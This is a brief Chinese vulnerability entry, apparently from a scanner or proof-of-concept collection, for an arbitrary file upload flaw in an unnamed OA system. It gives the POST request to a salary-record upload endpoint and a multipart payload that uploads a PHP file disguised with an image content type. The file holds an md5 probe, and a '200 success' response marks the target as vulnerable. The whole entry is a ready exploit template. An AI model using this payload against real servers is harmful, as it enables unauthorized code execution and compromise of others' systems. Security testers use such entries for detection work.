# 某未知OA文件上传漏洞B

某未知OA ｜ 文件上传 ｜ —
- **请求**：`POST /index.php/salary/record/upload HTTP/1.1`

**Payload**
```
------------398jnjVTTlDVXHlE7yYnfwBoix
Content-Disposition: form-data; name="file"; filename="dudesuite.php"
Content-Type: image/jpg
<?php echo md5(1)?>
------------398jnjVTTlDVXHlE7yYnfwBoix
```
- **响应特征**：200 success